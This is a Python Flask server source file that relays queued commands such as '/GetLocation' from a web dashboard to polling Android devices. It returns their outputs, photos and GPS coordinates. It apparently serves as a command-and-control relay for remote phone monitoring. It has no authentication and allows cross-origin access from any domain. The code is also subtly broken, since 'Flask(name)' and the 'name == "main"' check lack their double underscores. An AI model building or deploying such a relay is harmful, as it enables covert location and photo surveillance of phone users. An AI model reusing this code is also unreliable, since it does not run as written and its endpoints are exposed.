import time
import logging
from flask import Flask, request, jsonify
from flask_cors import CORS

# Configure logging for Render.com dashboard visibility
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s'
)

app = Flask(name)
CORS(app)  # Allows Device Y Dashboard to connect seamlessly from any domain

# ==========================================
# IN-MEMORY VOLATILE STORES (RAM ONLY)
# ==========================================
pending_commands = {}  # { "ANDROID_ID": { "cmd": "/GetLocation", "timestamp": 12345678 } }
device_results = {}    # { "ANDROID_ID": { "cmd": "/GetLocation", "result": "...", "timestamp": 12345678 } }
active_devices = {}    # { "ANDROID_ID": "2026-09-20 23:40:00" }

DATA_TTL_SECONDS = 600  # 10 Minutes RAM Cleanup limit


def cleanup_stale_data():
    """ Automatically purge data older than 10 minutes to prevent RAM memory leaks """
    current_time = time.time()
    
    # Purge stale results
    expired_results = [
        dev_id for dev_id, data in device_results.items()
        if current_time - data.get("timestamp", 0) > DATA_TTL_SECONDS
    ]
    for dev_id in expired_results:
        device_results.pop(dev_id, None)

    # Purge stale pending commands
    expired_cmds = [
        dev_id for dev_id, data in pending_commands.items()
        if current_time - data.get("timestamp", 0) > DATA_TTL_SECONDS
    ]
    for dev_id in expired_cmds:
        pending_commands.pop(dev_id, None)


@app.route("/", methods=["GET"])
def home():
    cleanup_stale_data()
    return jsonify({
        "status": "online",
        "system": "Device X Automation Relay Server",
        "active_devices_count": len(active_devices),
        "server_time": time.strftime("%Y-%m-%d %H:%M:%S")
    }), 200


# ==========================================
# 1. ANDROID APP ENDPOINTS (Device X)
# ==========================================

@app.route("/get-command", methods=["GET"])
def get_command():
    """ Android App (Device X) polls this endpoint every 5 seconds """
    cleanup_stale_data()
    device_id = request.args.get("device_id")
    
    if not device_id:
        return jsonify({"error": "device_id parameter required"}), 400

    # Mark device active
    active_devices[device_id] = time.strftime("%Y-%m-%d %H:%M:%S")

    # Fetch queued command for this specific hardware ID
    if device_id in pending_commands and pending_commands[device_id]:
        command_data = pending_commands.pop(device_id)
        logging.info(f"Delivered command '{command_data['cmd']}' to device: {device_id}")
        return jsonify(command_data), 200

    return jsonify({"cmd": None}), 200


@app.route("/post-result", methods=["POST"])
def post_result():
    """ Android App posts execution outputs/photos/GPS coordinates back here """
    cleanup_stale_data()
    data = request.get_json(silent=True)
    
    if not data:
        return jsonify({"error": "Invalid or missing JSON payload"}), 400

    device_id = data.get("device_id")
    cmd = data.get("cmd")
    result = data.get("result")

    if not device_id or not cmd:
        return jsonify({"error": "Missing device_id or cmd parameters"}), 400

    # Save output to RAM for Device Y
    device_results[device_id] = {
        "cmd": cmd,
        "result": result,
        "timestamp": time.time()
    }

    active_devices[device_id] = time.strftime("%Y-%m-%d %H:%M:%S")
    logging.info(f"Received result for '{cmd}' from device: {device_id}")

    return jsonify({"status": "success"}), 200


# ==========================================
# 2. DASHBOARD / CONTROLLER ENDPOINTS (Device Y)
# ==========================================

@app.route("/send-command", methods=["POST"])
def send_command():
    """ Device Y / Web Dashboard sends slash commands to a target hardware ID """
    cleanup_stale_data()
    data = request.get_json(silent=True)
    
    if not data:
        return jsonify({"error": "Invalid or missing JSON payload"}), 400

    device_id = data.get("device_id")
    cmd = data.get("cmd")
    if not device_id or not cmd:
        return jsonify({"error": "Missing target device_id or cmd parameters"}), 400

    pending_commands[device_id] = {
        "cmd": cmd,
        "timestamp": time.time()
    }

    logging.info(f"Queued command '{cmd}' for target device: {device_id}")

    return jsonify({
        "status": "queued",
        "target_device": device_id,
        "command": cmd
    }), 200


@app.route("/get-result", methods=["GET"])
def get_result():
    """ Device Y polls this endpoint to fetch execution response from Device X """
    cleanup_stale_data()
    device_id = request.args.get("device_id")
    
    if not device_id:
        return jsonify({"error": "device_id parameter required"}), 400

    if device_id in device_results:
        result_data = device_results.pop(device_id)
        return jsonify(result_data), 200

    return jsonify({"status": "no_data_yet"}), 200


@app.route("/list-devices", methods=["GET"])
def list_devices():
    """ Dashboard fetches list of all connected Android hardware IDs """
    cleanup_stale_data()
    return jsonify({
        "active_devices": active_devices
    }), 200


if name == "main":
    app.run(host="0.0.0.0", port=5000)
